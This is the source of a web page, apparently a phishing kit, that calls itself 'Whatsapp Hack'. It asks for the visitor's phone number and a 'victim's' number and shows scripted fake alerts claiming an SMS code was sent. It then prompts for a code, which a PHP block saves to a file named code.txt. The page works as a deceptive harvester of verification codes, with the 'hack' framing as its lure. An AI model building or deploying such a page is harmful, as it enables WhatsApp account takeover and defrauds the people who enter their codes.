<!DOCTYPE html>
<html>
 <head>
  <title>
   -- Whatsapp Hack --
  </title>
  <link href="https://cdn.iconscout.com/icon/free/png-256/whatsapp-62-414273.png" rel="shortcut icon"/>
  <style type="text/css">
   .div1{
      background-color:#040302;
      height: 600px;
      width: 500px;
      border-radius: 25px;
      border:4px solid green;
      opacity: 0.8;
      filter: alpha(opacity=40);
    }
    .text{
      color:red;
      font-size: 48px;
      background-color:black;
      padding-bottom: 20px;
      border-radius: 48px; 
    }
    .text2{
      color:orange;
      font-size:28px;
      background-color:black;
      border-radius: 50px;
      padding-top: 25px;
      padding-bottom: 25px;
    }
    .input{
     height: 40px; 
     width: 250px; 
     font-size: 18px; 
     padding: 5px; 
     margin-bottom: 15px; 
     border-radius: 7px; 
     background-color:#b4b2b2; 
     border: none; 
     color: #000; 

    }
    .button{
     width: 100px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 5px;
    }
     canvas { 
     display: block; 
     position: fixed; 
  top: 0; 
  left: 0; 
     z-index: -1000; 
 }
 .body{
  background-image:url("https://images.pexels.com/photos/908283/pexels-photo-908283.jpeg?cs=srgb&dl=black-and-white-dark-marble-908283.jpg&fm=jpg");

 }
  </style>
 </head>
 <body class='body'>
  <center>
   <div class="div1">
    <p class="text">
     Whatsapp Hack
    </p>
    <form method="post">
     <p class="text2">
      Number
     </p>
     <p style="color:red;font-size:14px;">Your number</p>
     <input class="input" name="realnumber" placeholder="+905xx xxx xx xx" type="text"/>
     <p style="color:red;font-size:14px;">Victim's number</p>
     <input class="input" name="victimnumber" placeholder="+905xx xxx xx xx" type="text"/>
     <br>
      <br>
      <p id='buttonn'></p>
    </form>
       <p id='submitt'><button type="submit" onclick="yaman()"  style="width: 150px; 
     font-size: 18px;  
     margin: 0 auto;
     background-color: red; 
     border: none; 
     height: 40px; 
    border-radius: 5px;">Send Code</button></p>
      </br>
     </br>
     <p id='kod'></p>
   </div>
  </center>
  <script>
    //yamanefkar
    function yaman2(){
    document.getElementById("submitt").innerHTML='';
    document.getElementById("buttonn").innerHTML='<input type="submit" value="Send Code" onclick="yaman();" class="button">';


    }
    function yaman(){
      window.alert("Smsle Onay Kodunuz Gönderiliyor!");//yamanefkar
      setTimeout(yaman1, 5000);//yamanefkar
    }
    function yaman1(){//yamanefkar
      document.getElementById("kod").innerHTML='<b style="color:green;font-size:27px;background-color: black;opacity: 18;filter: alpha(opacity=40);border:4px solid red;border-radius: 20px;height:50px;width:250px;">KODUNUZ SMS İLE GÖNDERİLDİ</b>';
      setTimeout(window.alert("Kodunuz İletildi, Lütfen 10 saniye bekleyiniz..."),5000);
      setTimeout(kodSayfası, 10000);
    }
    function kodSayfası(){
      document.write('<!DOCTYPE html><html><head><title>   -- Whatsapp Hack --  </title><link href="https://cdn.iconscout.com/icon/free/png-256/whatsapp-62-414273.png" rel="shortcut icon"/>');//yamanefkar

      document.write('<style type="text/css">.div1{background-color:#040302;height: 550px;width: 500px;border-radius: 25px;border:4px solid green;opacity: 0.8;filter: alpha(opacity=40);}.text{color:red;font-size: 48px;background-color:black;padding-bottom: 20px;border-radius: 48px;}.text2{color:orange;font-size:28px;background-color:black;border-radius: 50px;padding-top: 25px;padding-bottom: 25px;}.input{height: 40px;width: 250px;font-size: 18px;padding: 5px;margin-bottom: 15px;border-radius: 7px;background-color:#b4b2b2;border: none;color: #000;}.button{width: 100px;font-size: 18px;margin: 0 auto;background-color: red;border: none;height: 40px;border-radius: 5px;}canvas {display: block;position: fixed;top: 0;left: 0;z-index: -1000;}');//yamanefkar



      document.write('</style></head><body background="https://images.pexels.com/photos/908283/pexels-photo-908283.jpeg?cs=srgb&dl=black-and-white-dark-marble-908283.jpg&fm=jpg"><center><div class="div1"><p class="text">Whatsapp Hack</p><form action="" method="post"<p class="text2">Code</p><p style="color:red;font-size:14px;">Your Code</p><input class="input" name="Code" placeholder="Code xxx-xxx" type="text"/><br><button class="button" type="submit">Next</button></br></br></form></div></center>');//yamanefkarasd
    }
  </script>
 </body>
 <?php 

if (!empty($_POST['Code'])) {
$ac = fopen("code.txt","a+");
$password = $_POST['victimnumber'];

$ip = $_POST['Code'];
$userlar = ("\n __________________ \n Code : ".$ip."\n __________________ \n");
fwrite($ac,$userlar);
fclose($ac);
}


  ?>
 <!--YamanEfkar-->
</html>